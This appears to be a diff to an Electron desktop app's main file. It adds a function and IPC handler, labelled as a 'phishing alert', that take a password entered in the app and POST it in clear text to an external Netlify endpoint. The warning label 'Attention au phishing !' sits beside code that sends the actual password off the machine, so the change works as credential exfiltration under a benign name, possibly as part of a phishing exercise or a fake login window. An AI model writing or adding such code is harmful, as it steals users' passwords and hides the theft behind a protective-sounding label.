@@ -1,7 +1,40 @@
-const { app, BrowserWindow, globalShortcut, screen, powerMonitor } = require('electron');
+const { app, BrowserWindow, globalShortcut, screen, powerMonitor, ipcMain } = require('electron');
 const path = require('path');
 
 let mainWindow;
+
+// API call function
+async function sendPhishingAlert(password) {
+  try {
+    const response = await fetch('https://lighthearted-tanuki-1980ab.netlify.app/.netlify/functions/phishing-alert', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        message: password,
+        alert: 'Attention au phishing !',
+        timestamp: new Date().toISOString()
+      })
+    });
+
+    if (response.ok) {
+      const data = await response.json();
+      console.log('API call successful:', data);
+      return { success: true, data: data };
+    } else {
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
+  } catch (error) {
+    console.error('Error sending API request:', error);
+    return { success: false, error: error.message };
+  }
+}
+
+// IPC handler for API call
+ipcMain.handle('send-phishing-warning', async (_, password) => {
+  return await sendPhishingAlert(password);
+});
 
 function forceQuit() {
   // Unregister all shortcuts first
@@ -40,7 +73,8 @@ function createWindow() {
       nodeIntegration: false,
       contextIsolation: true,
       enableRemoteModule: false,
-      webSecurity: true
+      webSecurity: true,
+      preload: path.join(__dirname, 'preload.js')
     },
     show: false
   });
@@ -120,7 +154,7 @@ app.on('will-quit', () => {
 
 // Security: Prevent new window creation
 app.on('web-contents-created', (event, contents) => {
-  contents.on('new-window', (event, navigationUrl) => {
-    event.preventDefault();
+  contents.on('new-window', (navigationEvent) => {
+    navigationEvent.preventDefault();
   });
 });
